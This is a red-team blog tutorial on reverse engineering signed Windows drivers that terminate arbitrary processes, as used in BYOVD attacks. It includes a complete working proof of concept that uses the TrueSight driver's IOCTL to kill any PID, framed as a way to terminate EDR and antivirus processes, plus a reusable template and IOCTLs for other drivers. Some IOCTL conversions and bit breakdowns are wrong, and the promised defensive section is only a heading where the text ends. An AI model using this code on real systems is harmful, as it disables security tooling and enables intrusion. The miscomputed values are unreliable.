---
title: "Methodology of Reversing Vulnerable Killer Drivers"
categories:
  - Blog
tags:
  - Windows
  - Red Team
---

## Table of Contents
 
1. [Introduction](#introduction)
2. [Windows Driver Internals: Concepts You Must Know](#windows-driver-internals-concepts-you-must-know)
   - [What Is a Driver, Really?](#what-is-a-driver-really)
   - [DriverEntry: The Kernel's main()](#driverentry-the-kernels-main)
   - [Device Objects and Symbolic Links](#device-objects-and-symbolic-links)
   - [Dispatch Routines and the MajorFunctions Array](#dispatch-routines-and-the-majorfunctions-array)
   - [I/O Control Codes (IOCTLs)](#io-control-codes-ioctls)
   - [Key Kernel APIs: ZwOpenProcess and ZwTerminateProcess](#key-kernel-apis-zwopenprocess-and-zwterminateprocess)
3. [The BYOVD Threat Landscape](#the-byovd-threat-landscape)
   - [Why Signed Drivers Are Dangerous](#why-signed-drivers-are-dangerous)
   - [loldrivers.io: A Catalog of Weaponizable Drivers](#loldriversio-a-catalog-of-weaponizable-drivers)
   - [The Killer Driver Archetype](#the-killer-driver-archetype)
4. [Reversing Methodology: A Step-by-Step Framework](#reversing-methodology-a-step-by-step-framework)
   - [Setting Up IDA Free](#setting-up-ida-free)
   - [Phase 1 — Locating DriverEntry and Initialization Logic](#phase-1--locating-driverentry-and-initialization-logic)
   - [Phase 2 — Identifying Device and Symbolic Link Creation](#phase-2--identifying-device-and-symbolic-link-creation)
   - [Phase 3 — Hunting Dangerous API Imports](#phase-3--hunting-dangerous-api-imports)
   - [Phase 4 — Tracing Cross-References to Find the Call Chain](#phase-4--tracing-cross-references-to-find-the-call-chain)
   - [Phase 5 — Identifying IOCTLs](#phase-5--identifying-ioctls)
   - [Phase 6 — Building a Proof of Concept](#phase-6--building-a-proof-of-concept)
5. [Hands-On Analysis: Four Killer Drivers](#hands-on-analysis-four-killer-drivers)
   - [Truesight.sys](#truesightsys)
   - [Ksapi64.sys](#ksapi64sys)
   - [TfSysmon.sys](#tfsysmonsys)
   - [Viragt64.sys](#viragt64sys)
6. [IOCTL Decoding Reference](#ioctl-decoding-reference)
7. [Defensive Factors and Mitigations](#defensive-factors-and-mitigations)
   - [Why Unrestricted Process Termination Is Dangerous](#why-unrestricted-process-termination-is-dangerous)
   - [Protected Process Light (PPL)](#protected-process-light-ppl)
   - [Design Recommendations for Driver Developers](#design-recommendations-for-driver-developers)
   - [Detecting BYOVD at Runtime](#detecting-byovd-at-runtime)
8. [Conclusion](#conclusion)
 
---
 
## Introduction
 
Vulnerable kernel drivers are one of the most reliable and underappreciated attack primitives available to adversaries operating at the intersection of post-exploitation and defense evasion. Even when vendors release patches, the original signed binaries persist: archived on old installations, redistributed by legitimate software packages, cached in driver stores, and traded across attacker infrastructure. They are trusted by Windows, signed by legitimate certificate authorities, and quietly lethal.
 
This category of attack has a name in the threat intelligence community: **BYOVD** — Bring Your Own Vulnerable Driver. The technique involves an attacker loading a known-vulnerable, legitimately-signed kernel driver onto a target system to exploit its flawed functionality — typically to terminate EDR processes, kill antivirus, or gain arbitrary kernel read/write primitives — without ever needing a zero-day exploit.
 
BYOVD is no longer a theoretical concern. It has been used by ransomware groups (BlackByte, RobbinHood, AvosLocker), nation-state APTs (Lazarus Group's `POORTRY` driver campaign), and commercial offensive toolkits. The technique is pervasive precisely because it is difficult to prevent: blocking driver loading requires strong allowlist policies, and many environments cannot afford that operational cost.
 
This post focuses on **killer drivers** — a specific subclass of vulnerable drivers whose primary exploitable functionality is the ability to terminate arbitrary processes, including security software. We will cover:
 
- The theoretical foundations of Windows kernel driver architecture
- A systematic reverse engineering methodology applicable to any killer driver
- Hands-on analysis of four real-world killer drivers: Truesight.sys, Ksapi64.sys, TfSysmon.sys, and Viragt64.sys
- The defensive landscape: why these vulnerabilities persist, what PPL protects, and how to detect BYOVD at runtime
 
---
 
## Windows Driver Internals: Concepts You Must Know
 
Before loading a binary into IDA, it is essential to understand the architectural concepts that govern how Windows kernel drivers operate. Without this foundation, the disassembly is noise. With it, the structure becomes immediately legible.
 
### What Is a Driver, Really?
 
At the most basic level, a driver is a **kernel-mode DLL** — a PE binary that runs in ring 0, with direct access to kernel data structures, physical memory, and privileged CPU instructions. Unlike regular DLLs, drivers do not export a `DllMain`. They export a single mandatory entry point called `DriverEntry`, and beyond that, their execution is entirely event-driven.
 
A driver does not have a persistent main thread of execution. It registers a set of **callback routines** with the Windows I/O Manager, and those routines are invoked on demand whenever a matching event or request arrives. From this perspective, a driver is more like a collection of registered handlers than a traditional program.
 
Because drivers run in kernel mode, their bugs have catastrophic consequences. A NULL pointer dereference that would crash a user-mode process will instead trigger a **Bug Check (BSOD)** on a driver. An out-of-bounds write can corrupt kernel memory, enabling privilege escalation or arbitrary code execution at ring 0.
 
### DriverEntry: The Kernel's main()
 
`DriverEntry` is the first function the kernel calls when a driver is loaded. It receives two parameters:
 
```c
NTSTATUS DriverEntry(
    PDRIVER_OBJECT  DriverObject,   // Pointer to the driver's kernel object
    PUNICODE_STRING RegistryPath    // Path to the driver's registry key
);
```
 
The `DriverObject` is the most important parameter. It is a kernel-allocated structure (`_DRIVER_OBJECT`) that represents the driver in the kernel's object manager. Every dispatch routine the driver registers is stored in this structure. At a minimum, `DriverEntry` is expected to:
 
1. Initialize the driver's internal state
2. Create any device objects needed for communication
3. Register dispatch routines for IRP handling
4. Set the `DriverUnload` routine (optional but good practice)
 
If `DriverEntry` returns a non-success `NTSTATUS`, the driver is immediately unloaded.
 
### Device Objects and Symbolic Links
 
For a driver to be accessible from user space, it must expose a **communication surface**. This is a two-step process:
 
**Step 1: Create a Device Object** (`IoCreateDevice`)
 
A device object (`_DEVICE_OBJECT`) is the kernel-side entity that user-mode I/O operations target. Creating one requires specifying a device name in the kernel namespace:
 
```c
UNICODE_STRING deviceName;
RtlInitUnicodeString(&deviceName, L"\\Device\\MyDriver");
 
PDEVICE_OBJECT pDeviceObject;
IoCreateDevice(
    DriverObject,
    sizeof(MY_DEVICE_EXTENSION),
    &deviceName,
    FILE_DEVICE_UNKNOWN,
    FILE_DEVICE_SECURE_OPEN,
    FALSE,
    &pDeviceObject
);
```
 
**Step 2: Create a Symbolic Link** (`IoCreateSymbolicLink`)
 
The kernel device name (`\Device\MyDriver`) is not directly accessible from user space. A symbolic link in the `\DosDevices\` namespace bridges this gap, making the device accessible as `\\.\MyDriver` from Win32 APIs:
 
```c
UNICODE_STRING symbolicLink;
RtlInitUnicodeString(&symbolicLink, L"\\DosDevices\\MyDriver");
IoCreateSymbolicLink(&symbolicLink, &deviceName);
```
 
After this, a user-mode process can call `CreateFile(L"\\\\.\\MyDriver", ...)` to obtain a handle to the driver's device and interact with it via `DeviceIoControl`, `ReadFile`, `WriteFile`, etc.
 
**When reversing a driver, finding the pair `IoCreateDevice` + `IoCreateSymbolicLink` in close proximity is the clearest indicator that you've found the initialization routine responsible for exposing the driver to user space.** Note down the device name and symbolic link — you will need them in your PoC.
 
### Dispatch Routines and the MajorFunctions Array
 
The `DriverObject->MajorFunctions` field is an array of 28 function pointers, indexed by **IRP Major Function codes** (defined as `IRP_MJ_*` constants). Each entry corresponds to a specific type of I/O operation:
 
| Index | Constant | Triggered by |
|-------|----------|-------------|
| 0x00 | `IRP_MJ_CREATE` | `CreateFile` |
| 0x02 | `IRP_MJ_READ` | `ReadFile` |
| 0x03 | `IRP_MJ_WRITE` | `WriteFile` |
| 0x0E | `IRP_MJ_DEVICE_CONTROL` | `DeviceIoControl` |
| 0x0F | `IRP_MJ_INTERNAL_DEVICE_CONTROL` | Kernel-mode `IoBuildDeviceIoControlRequest` |
 
The most security-relevant entry is `IRP_MJ_DEVICE_CONTROL` (index 14, `0x0E`). The routine assigned to this index is called **the IOCTL dispatch handler**, and it is the primary interface through which user-mode code sends commands to the driver and receives responses.
 
In `DriverEntry` (or a function called by it), you will typically see code like:
 
```c
DriverObject->MajorFunctions[IRP_MJ_CREATE]         = DispatchCreateClose;
DriverObject->MajorFunctions[IRP_MJ_CLOSE]          = DispatchCreateClose;
DriverObject->MajorFunctions[IRP_MJ_DEVICE_CONTROL] = DispatchIoControl;
```
 
In IDA's decompiled view, these assignments appear as array indexing:
 
```c
DriverObject->MajorFunctions[14] = sub_140001690;  // This is the IOCTL handler
```
 
Identifying which function is assigned to index `[14]` immediately reveals the IOCTL dispatch routine — the entry point for all driver commands from user space.
 
### I/O Control Codes (IOCTLs)
 
An IOCTL (I/O Control Code) is a 32-bit value that acts as a **command identifier** for `DeviceIoControl` calls. The kernel passes this value to the driver's IOCTL dispatch handler inside the IRP (I/O Request Packet), where the driver reads it and branches to the appropriate handler function.
 
IOCTLs are constructed with the `CTL_CODE` macro:
 
```c
#define CTL_CODE(DeviceType, Function, Method, Access) \
    (((DeviceType) << 16) | ((Access) << 14) | ((Function) << 2) | (Method))
```
 
Breaking down a typical IOCTL value like `0x22E044`:
 
```
0x22E044 = 0000 0000 0010 0010 1110 0000 0100 0100
 
Bits 31-16: DeviceType = 0x0022  (FILE_DEVICE_UNKNOWN)
Bits 15-14: Access     = 0x0     (FILE_ANY_ACCESS)
Bits 13-02: Function   = 0x811   (vendor-defined function code)
Bits 01-00: Method     = 0x0     (METHOD_BUFFERED)
```
 
In IDA's decompiled output, the IOCTL dispatch handler typically looks like a chain of `if/else if` or `switch` comparisons against these constant values:
 
```c
if (ioControlCode == 0x22E044) {
    result = TerminateProcessHandler(inputBuffer, inputLength);
} else if (ioControlCode == 0x22E040) {
    result = OpenProcessHandler(inputBuffer, inputLength);
} else {
    result = STATUS_INVALID_DEVICE_REQUEST;
}
```
 
Finding these constants is the final step in the reversing chain — once you know the IOCTL and the device name, you can write a PoC.
 
### Key Kernel APIs: ZwOpenProcess and ZwTerminateProcess
 
The two kernel APIs that appear in virtually every killer driver are:
 
**`ZwOpenProcess`** — Opens a handle to a process object given its process ID (PID) and a set of desired access rights. In kernel mode, process handles obtained this way bypass many of the access checks that apply in user mode.
 
```c
NTSTATUS ZwOpenProcess(
    PHANDLE            ProcessHandle,
    ACCESS_MASK        DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PCLIENT_ID         ClientId          // Contains the target PID
);
```
 
**`ZwTerminateProcess`** — Terminates the process associated with a given handle. When called from kernel mode without proper validation, there is no restriction on which process can be targeted — including EDR processes running as PPL, SYSTEM processes, or critical Windows infrastructure like `lsass.exe`.
 
```c
NTSTATUS ZwTerminateProcess(
    HANDLE   ProcessHandle,
    NTSTATUS ExitStatus
);
```
 
The typical pattern in vulnerable killer drivers is:
 
1. Receive a PID in the IOCTL input buffer
2. Construct a `CLIENT_ID` with that PID
3. Call `ZwOpenProcess` with `PROCESS_TERMINATE` access
4. Call `ZwTerminateProcess` on the resulting handle
5. Close the handle with `ZwClose`
 
All without any validation of whether the target process is critical, protected, or even exists.
 
---
 
## The BYOVD Threat Landscape
 
### Why Signed Drivers Are Dangerous
 
Windows requires kernel-mode drivers to be signed by a trusted certificate authority since 64-bit Windows Vista. The **Driver Signature Enforcement (DSE)** policy is enforced at load time: unsigned drivers are rejected unless Secure Boot and HVCI are disabled.
 
This sounds like a strong mitigation, but it has a critical gap: **a driver signed at any point in the past, even by a revoked certificate, may still load if the revocation infrastructure is not enforced correctly**. Moreover, many legitimate software vendors have inadvertently shipped drivers with exploitable vulnerabilities — and those drivers carry their vendor's valid signature.
 
The economics are straightforward for an attacker:
- A zero-day kernel exploit requires months of research and has a limited shelf life
- A signed vulnerable driver is freely downloadable, immediately deployable, and may remain exploitable for years
 
This is why BYOVD attacks have become the dominant kernel exploitation technique for commodity threat actors and advanced adversaries alike.
 
### loldrivers.io: A Catalog of Weaponizable Drivers
 
[loldrivers.io](https://www.loldrivers.io/) is an open community-maintained database of **living off the land drivers** — legitimate, signed Windows drivers that contain known vulnerabilities or have been actively abused in real-world attacks. The database includes:
 
- Driver file names and hashes (SHA1, SHA256, MD5)
- Associated CVEs where applicable
- Known abuse techniques and capabilities
- Samples (where legally available)
- Detection rules (Sigma, YARA)
 
For a security researcher, loldrivers.io is an invaluable training ground. Working through multiple entries in sequence is one of the fastest ways to develop intuition for driver reversing — you are always working with binaries where you know the vulnerability exists, which trains your eye to recognize the patterns.
 
A very effective methodology is to:
1. Pick a driver from loldrivers.io with a known "process termination" capability
2. Download the sample (rename from `.bin` to `.sys` before loading in IDA)
3. Attempt to find the vulnerable IOCTL path entirely through static analysis
4. Validate your findings with a PoC in an isolated VM
 
Repeating this process with 10–20 drivers builds pattern recognition that transfers immediately to unknown samples.
 
### The Killer Driver Archetype
 
Across dozens of analyzed killer drivers, a remarkably consistent structural pattern emerges:
 
```
DriverEntry
    └── Initialization function
            ├── IoCreateDevice        → creates \Device\<name>
            ├── IoCreateSymbolicLink  → creates \\.\<name>
            └── MajorFunctions[14]  = DispatchIoControl
 
DispatchIoControl
    └── Switch / If-Else on IOCTL code
            └── 0xXXXXXXXX → KillProcessHandler
                    └── ZwOpenProcess(target PID, PROCESS_TERMINATE)
                            └── ZwTerminateProcess(handle, 0)
```
 
Every killer driver is a variation on this theme. The differences lie in:
- Whether initialization logic is in `DriverEntry` directly or in a sub-function
- How many IOCTL codes are exposed (some drivers have dozens of capabilities)
- How deeply nested the call to `ZwTerminateProcess` is
- Whether any validation logic exists (usually: none)
- How IOCTLs are represented in the disassembly (hex, decimal, or negative integers)
 
Understanding this archetype means you can approach any new killer driver with a clear mental map of what you are looking for.
 
---
 
## Reversing Methodology: A Step-by-Step Framework
 
This section documents a reproducible six-phase methodology for reversing killer drivers in IDA Free. The methodology is intentionally tool-agnostic — the same phases apply in Ghidra, Binary Ninja, or with manual analysis in a disassembler.
 
### Setting Up IDA Free
 
IDA Free is sufficient for analyzing most kernel drivers. Download it from [hex-rays.com/ida-free](https://hex-rays.com/ida-free/). When loading a driver:
 
1. Rename the file from `.bin` (as downloaded from loldrivers.io) to `.sys` before loading — IDA uses the extension as a hint for the PE type and applies AMD64 processor settings correctly.
2. Accept the default analysis options. IDA will automatically identify `DriverEntry` by its well-known signature.
3. Wait for auto-analysis to complete before beginning manual work.
4. Open the **Pseudocode** view (`F5` on any function) — the decompiled C-like output is substantially faster to read than raw disassembly for this type of analysis.
5. Open the **Imports** window (`View → Open subviews → Imports`) — this is your first filter for interesting API calls.
 
### Phase 1 — Locating DriverEntry and Initialization Logic
 
IDA typically identifies `DriverEntry` automatically and labels it. If not, it is always the function registered as the PE entry point (visible in the `Entry points` subview).
 
Examine `DriverEntry` first in pseudocode. Some drivers implement all initialization directly here (Ksapi64 is an example). Others keep `DriverEntry` minimal and delegate to an initialization sub-function called immediately (TrueSight and TfSysmon follow this pattern).
 
**What to look for in Phase 1:**
- A call to a single large sub-function early in `DriverEntry` → this is likely the initialization routine
- Direct calls to `IoCreateDevice` or `IoCreateSymbolicLink` in `DriverEntry` → initialization is inline
- Assignments to `DriverObject->MajorFunctions[N]` → dispatch routine registration
 
### Phase 2 — Identifying Device and Symbolic Link Creation
 
Navigate into the initialization routine (or stay in `DriverEntry` if initialization is inline). Search for calls to `IoCreateDevice` and `IoCreateSymbolicLink`.
 
**IoCreateDevice call analysis:**
The third parameter is the device name (a `PUNICODE_STRING`). Trace where this string is initialized — it will contain the kernel device path (e.g., `\Device\TrueSight`).
 
**IoCreateSymbolicLink call analysis:**
The first parameter is the symbolic link name. This is the string you will use in `CreateFile` in your PoC (e.g., `\DosDevices\TrueSight` → `\\.\TrueSight`).
 
Note both strings. You cannot write a working PoC without them.
 
**Also note in Phase 2:**
- `MajorFunctions` assignments, particularly index `[14]` → `IRP_MJ_DEVICE_CONTROL`
- Any common stub/passthrough routine assigned to multiple `MajorFunctions` entries
 
### Phase 3 — Hunting Dangerous API Imports
 
Open the Imports window (`View → Open subviews → Imports`). Filter visually for security-relevant kernel APIs. The most impactful for killer driver analysis:
 
| API | Significance |
|-----|-------------|
| `ZwTerminateProcess` | Direct process termination |
| `ZwOpenProcess` | Obtains process handle from PID |
| `ZwClose` | Handle cleanup (confirms ZwOpenProcess/ZwTerminateProcess pair) |
| `ZwQuerySystemInformation` | Process enumeration (some drivers walk the process list) |
| `MmMapIoSpace` | Physical memory mapping (read/write drivers) |
| `MmCopyMemory` | Arbitrary kernel memory read |
| `ZwWriteVirtualMemory` | Kernel-originated process memory write |
| `ObReferenceObjectByHandle` | Dereferences kernel objects — used in process manipulation |
 
For killer driver analysis, `ZwTerminateProcess` is the primary target. Its presence in the imports is the clearest indicator that the driver has process termination capability.
 
### Phase 4 — Tracing Cross-References to Find the Call Chain
 
With `ZwTerminateProcess` identified in the Imports window:
 
1. Double-click it to navigate to the import thunk
2. Press `Ctrl+X` to open the **Cross References** dialog
3. Note every function that calls `ZwTerminateProcess`
 
Navigate to each calling function. Understand its parameters — specifically, how it receives the target PID. Does it take a PID directly? Does it call `ZwOpenProcess` first?
 
From the `ZwTerminateProcess` calling function, press `Ctrl+X` again to find what calls *it*. Continue this upward traversal until you reach a function that:
- Checks an IOCTL value in a conditional
- Is directly assigned to `MajorFunctions[14]`
- Processes an input buffer received from `DeviceIoControl`
 
This traversal chain typically requires 2–4 hops. Document each function in the chain and note the IRP input buffer parameter — this reveals what data your PoC needs to send.
 
### Phase 5 — Identifying IOCTLs
 
The IOCTL value will appear as a comparison constant in the dispatch handler. Common patterns:
 
**Direct comparison:**
```c
if (ioControlCode == 0x22E044) { ... }
```
 
**Switch statement:**
```c
switch (ioControlCode) {
    case 0x22E044: ...
    case 0x22E040: ...
}
```
 
**Decimal representation:**
```c
if (*(_DWORD*)inputBuffer == 2285636) { ... }  // 2285636 = 0x22E044
```
 
**Negative integer representation (Viragt64-style):**
Some drivers display IOCTLs as signed 32-bit values in IDA, resulting in large negative numbers. Right-click the constant → **Convert → Hexadecimal** to get the actual IOCTL value.
 
Once you have the IOCTL code, use the `CTL_CODE` anatomy to confirm it is well-formed and extract the device type, access, function, and method fields.
 
### Phase 6 — Building a Proof of Concept
 
With the device name, IOCTL code, and input buffer format identified, a PoC has three components:
 
```c
// 1. Open the device
HANDLE hDevice = CreateFileA(
    "\\\\.\\DriverSymbolicLink",  // from Phase 2
    GENERIC_READ | GENERIC_WRITE,
    0, NULL, OPEN_EXISTING,
    FILE_ATTRIBUTE_NORMAL, NULL
);
 
// 2. Prepare the input buffer
// Structure depends on Phase 4 analysis — typically just a DWORD PID
DWORD targetPid = <PID>;
 
// 3. Send the IOCTL
DeviceIoControl(
    hDevice,
    IOCTL_CODE,          // from Phase 5
    &targetPid,          // input buffer
    sizeof(targetPid),   // input buffer size
    NULL, 0,             // output buffer (if any)
    &bytesReturned,
    NULL
);
```
 
Always test PoCs in an isolated VM with kernel debugging enabled. Many killer drivers are flagged by EDRs — loading them in a production environment will trigger alerts.
 
---
 
## Hands-On Analysis: Four Killer Drivers
 
### Truesight.sys
 
> 📷 *[Insert screenshot: loldrivers.io entry for Truesight.sys showing driver details and download button]*
 
TrueSight is one of the most well-documented killer drivers, having been weaponized by multiple malware families. It is an excellent starting point because its structure is clean and its call chain is concise.
 
**Loading in IDA:**
 
Download the `.bin` from loldrivers.io and rename to `.sys`. Load into IDA Free and allow auto-analysis to complete.
 
> 📷 *[Insert screenshot: IDA opening TrueSight.sys — DriverEntry function visible, immediately delegating to sub_14000A000]*
 
`DriverEntry` in TrueSight is intentionally sparse — it immediately delegates to `sub_14000A000`. This is a common pattern where the driver developer keeps `DriverEntry` as a thin wrapper. Double-click into `sub_14000A000`.
 
**Phase 2 — Device Identification:**
 
> 📷 *[Insert screenshot: sub_14000A000 showing the device name string \Device\TrueSight visible in pseudocode]*
 
Within `sub_14000A000`, the device name `\Device\TrueSight` is visible as a string constant. Continuing down, a call to `sub_1400080D0` is visible. Enter this function.
 
> 📷 *[Insert screenshot: sub_1400080D0 showing IoCreateDevice call in pseudocode, with MajorFunctions assignments visible below]*
 
`sub_1400080D0` contains the `IoCreateDevice` call and the dispatch routine assignments. `MajorFunctions[14]` is assigned to `sub_140001690` — our IOCTL handler.
 
**Phase 3 — Import Analysis:**
 
> 📷 *[Insert screenshot: IDA Imports window with ZwOpenProcess and ZwTerminateProcess visible for TrueSight]*
 
Both `ZwOpenProcess` and `ZwTerminateProcess` are present in the imports window.
 
**Phase 4 — Cross-Reference Chain:**
 
Select `ZwTerminateProcess` in the Imports window and press `Ctrl+X`.
 
> 📷 *[Insert screenshot: Cross-references dialog showing ZwTerminateProcess called from sub_140002B7C]*
 
`ZwTerminateProcess` is called from `sub_140002B7C`. Opening this function in pseudocode reveals a straightforward implementation:
 
> 📷 *[Insert screenshot: sub_140002B7C pseudocode showing ZwOpenProcess → ZwTerminateProcess pattern with PID as input parameter]*
 
The function is remarkably clean. It takes a PID, calls `ZwOpenProcess` with `PROCESS_TERMINATE` access, and immediately calls `ZwTerminateProcess`. There are no validation checks whatsoever — no PPL check, no process name whitelist, no SYSTEM process exclusion.
 
Pressing `Ctrl+X` on `sub_140002B7C` reveals it is called from `sub_140002BC7`, which is in turn called from the IOCTL dispatch chain.
 
> 📷 *[Insert screenshot: Caller function showing conditional check with the IOCTL value 0x22E044 and call to the kill process function]*
 
**Phase 5 — IOCTL Identification:**
 
Following the call chain upward into the IOCTL dispatch handler (`sub_140001690`), the comparison constant `0x22E044` appears in a conditional check.
 
> 📷 *[Insert screenshot: IOCTL dispatch handler showing if (ioControlCode == 0x22E044) condition with the kill process branch clearly marked]*
 
Decoded: `CTL_CODE(0x22, 0x811, METHOD_BUFFERED, FILE_ANY_ACCESS) = 0x22E044`. This is the IOCTL that triggers the process termination path.
 
**Alternative approach — dispatch routine traversal:**
 
An equivalent path is to start from the `MajorFunctions[14]` assignment identified in Phase 2, navigate directly to the dispatch handler function, and read the IOCTL comparison constants there — rather than traversing the chain upward from `ZwTerminateProcess`. Both approaches lead to the same result.
 
> 📷 *[Insert screenshot: MajorFunctions[14] dispatch handler showing the IOCTL 0x22E044 and its handler branch]*
 
**Phase 6 — PoC:**
 
> ⚠️ *This driver is flagged by most EDRs. Test exclusively in isolated, air-gapped virtual machines with kernel debugging enabled.*
 
```cpp
#include <windows.h>
#include <iostream>
#include <cstdint>
#include <cstdio>
#include <cstdlib>
 
#define IOCTL_TERMINATE 0x22E044
#define DEVICE          "\\\\.\\TrueSight"
 
int main(int argc, char** argv) {
    ULONG bytesReturned = 0;
 
    HANDLE hDevice = CreateFileA(
        DEVICE,
        GENERIC_WRITE | GENERIC_READ,
        0, NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
 
    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to open device. Error: %d (0x%x)\n",
               GetLastError(), GetLastError());
        return 1;
    }
 
    printf("[+] Device handle obtained: %p\n", hDevice);
 
    unsigned int pid;
    printf("[?] Enter target PID: ");
    scanf("%u", &pid);
 
    BOOL result = DeviceIoControl(
        hDevice,
        IOCTL_TERMINATE,
        &pid,        sizeof(pid),
        NULL,        0,
        &bytesReturned,
        NULL
    );
 
    if (!result) {
        printf("[-] DeviceIoControl failed. Error: %d (0x%x)\n",
               GetLastError(), GetLastError());
    } else {
        printf("[+] Process %u terminated via TrueSight.\n", pid);
    }
 
    CloseHandle(hDevice);
    return 0;
}
```
 
---
 
### Ksapi64.sys
 
> 📷 *[Insert screenshot: loldrivers.io entry for Ksapi64.sys]*
 
Ksapi64.sys offers a useful structural contrast to TrueSight: rather than delegating initialization to a deeply nested sub-function, Ksapi64 places a substantial portion of its initialization logic directly inside `DriverEntry`. This makes it somewhat easier to analyze at the entry point but requires reading a larger function.
 
**Phase 1 — DriverEntry:**
 
> 📷 *[Insert screenshot: IDA pseudocode of Ksapi64.sys DriverEntry — noticeably larger than TrueSight's]*
 
The immediately visible difference is the length of `DriverEntry`. String constants for the device name, symbolic link, and internal paths are all visible within `DriverEntry` or in functions called very early from it. This illustrates an important principle: **there is no single canonical driver structure**. Some developers prefer thin entry points; others put everything inline.
 
**Phase 2 — Device and Dispatch Identification:**
 
> 📷 *[Insert screenshot: Ksapi64 DriverEntry pseudocode showing IoCreateDevice call and MajorFunctions assignments inline]*
 
The pseudocode clearly shows device creation and dispatch routine registration without requiring a sub-function dive. Note both the device name and `MajorFunctions[14]` assignment.
 
**Phase 3 and Phase 4 — Import Hunt and Cross-Reference Chain:**
 
> 📷 *[Insert screenshot: Imports window showing ZwTerminateProcess for Ksapi64]*
 
`ZwTerminateProcess` is present. Cross-referencing it leads to a function with identical semantics to TrueSight's kill function — a PID arrives in the input buffer, a process handle is opened, termination is called. The absence of any protective logic is identical.
 
> 📷 *[Insert screenshot: ZwTerminateProcess caller in Ksapi64 — pseudocode showing the unvalidated kill chain]*
 
**Phase 5 — IOCTL Identification:**
 
> 📷 *[Insert screenshot: Ksapi64 IOCTL dispatch handler showing the IOCTL constant 2237504 in decimal representation]*
 
In Ksapi64, the IOCTL is represented as the **decimal value** `2237504`. Converting: `2237504 = 0x222240`. This is a valid IOCTL value. The representation difference — hex in TrueSight, decimal in Ksapi64 — is a product of compiler and decompiler output choices, not a meaningful driver design difference.
 
Armed with the device name (noted in Phase 2) and IOCTL `0x222240`, the PoC structure is identical to TrueSight's — replace the device path string and IOCTL constant, and you have a working killer for Ksapi64.
 
---
 
### TfSysmon.sys
 
> 📷 *[Insert screenshot: loldrivers.io entry for TfSysmon.sys]*
 
TfSysmon.sys follows a structure nearly identical to TrueSight: a minimal `DriverEntry` that immediately calls an initialization sub-function. The interest here is less in structural novelty and more in reinforcing the methodology — seeing the same pattern in a third driver solidifies intuition.
 
**Phase 1 — DriverEntry:**
 
`DriverEntry` immediately calls `sub_17484`. Enter this function.
 
**Phase 2 — Initialization Analysis:**
 
> 📷 *[Insert screenshot: sub_17484 pseudocode showing device name creation and symbolic link setup for TfSysmon]*
 
Inside `sub_17484`, the device name is clearly visible as a string constant. `IoCreateDevice` and `IoCreateSymbolicLink` calls follow. `MajorFunctions[14]` is assigned to the IOCTL handler. The device name established here is the `\\.\` path your PoC will use.
 
**Phase 3 and Phase 4 — Import and Cross-Reference Analysis:**
 
`ZwTerminateProcess` is present in the imports. Cross-referencing leads to the kill function.
 
> 📷 *[Insert screenshot: TfSysmon ZwTerminateProcess caller — pseudocode showing unvalidated termination logic with no PPL check, no whitelist, process handle obtained and immediately terminated]*
 
A notable observation repeated across all three drivers so far: there is absolutely no validation logic around the termination call. No integrity level check, no comparison against a protected process list, no PPL-awareness. The PID received from the IOCTL input buffer goes directly into `ZwOpenProcess`.
 
This is not a coincidence — it is a reflection of the fact that most third-party driver developers simply do not consider the security implications of exposing kernel process termination via an IOCTL.
 
**Phase 5 — IOCTL:**
 
> 📷 *[Insert screenshot: TfSysmon IOCTL dispatch handler showing the IOCTL constant with the process termination branch]*
 
The IOCTL value follows the same pattern as the previous drivers. With this value and the device name from Phase 2, the PoC is complete.
 
---
 
### Viragt64.sys
 
> 📷 *[Insert screenshot: loldrivers.io entry for Viragt64.sys]*
 
Viragt64.sys introduces a practical reversing challenge worth documenting explicitly: **IOCTL values represented as signed decimal integers in IDA's decompiler output, including negative values**. This is a common stumbling block for analysts new to driver reversing.
 
**Phases 1–4 — Standard Methodology:**
 
The first four phases for Viragt64 follow the exact same methodology as the previous drivers. `DriverEntry` → initialization function → `IoCreateDevice`/`IoCreateSymbolicLink` → `MajorFunctions[14]` assignment → `ZwTerminateProcess` import → cross-reference chain upward. No surprises.
 
**Phase 5 — The IOCTL Representation Problem:**
 
When examining the IOCTL dispatch handler, instead of a familiar hexadecimal constant, IDA's decompiler outputs something like:
 
```c
if (ioControlCode == -2144337884) { ... }
```
 
or
 
```c
if (ioControlCode == 2147621412) { ... }
```
 
> 📷 *[Insert screenshot: Viragt64 IOCTL dispatch handler showing a large negative decimal IOCTL value in the comparison — visually confusing]*
 
This is disorienting at first. The root cause is that IDA has chosen to represent the 32-bit IOCTL constant as a **signed decimal integer** rather than hexadecimal. The underlying value is correct — it is just displayed in an unhelpful format.
 
**The Fix: IDA's Convert Feature**
 
The resolution is simple:
 
1. Right-click the decimal/negative constant in the pseudocode
2. Select **Convert → Hexadecimal**
3. IDA immediately rewrites the constant in hex
 
> 📷 *[Insert screenshot: IDA right-click context menu on the decimal constant showing the "Convert → Hexadecimal" option]*
 
> 📷 *[Insert screenshot: Same pseudocode after conversion — the constant is now shown as a recognizable hexadecimal IOCTL value]*
 
After conversion, the value is in standard IOCTL format and can be used directly in a PoC.
 
**Why This Matters Beyond Viragt64:**
 
This is not a quirk specific to Viragt64. IDA's type inference can present the same 32-bit constant as decimal, hexadecimal, a negative signed integer, or even a character literal depending on how the compiler generated the code and what type IDA infers for the comparison target. Developing the reflex to right-click suspicious constants and check their representation in other formats is a fundamental IDA skill that pays dividends across all binary analysis work.
 
---
 
## IOCTL Decoding Reference
 
For quick reference, here are the four drivers analyzed with their key parameters. Device names and IOCTLs for the last three are left for the reader to derive through the methodology — this is intentional practice.
 
| Driver | Device Name | Symbolic Link | Kill IOCTL | Input Buffer |
|--------|-------------|---------------|-----------|-------------|
| Truesight.sys | `\Device\TrueSight` | `\\.\TrueSight` | `0x22E044` | `DWORD` PID |
| Ksapi64.sys | *(Phase 2 analysis)* | `\\.\<name>` | `0x222240` | `DWORD` PID |
| TfSysmon.sys | *(Phase 2 analysis)* | `\\.\<name>` | *(Phase 5 analysis)* | `DWORD` PID |
| Viragt64.sys | *(Phase 2 analysis)* | `\\.\<name>* | *(post-conversion hex)* | `DWORD` PID |
 
**IOCTL Anatomy Quick Reference:**
 
```
Bits 31–16 → Device Type
Bits 15–14 → Required Access   (00=ANY, 01=READ, 10=WRITE, 11=READ|WRITE)
Bits 13–02 → Function Code     (0x800+ for vendor-defined)
Bits 01–00 → Transfer Method   (00=BUFFERED, 01=INOUT, 02=NEITHER, 03=DIRECT_OUT)
```
 
---
 
## Defensive Factors and Mitigations
 
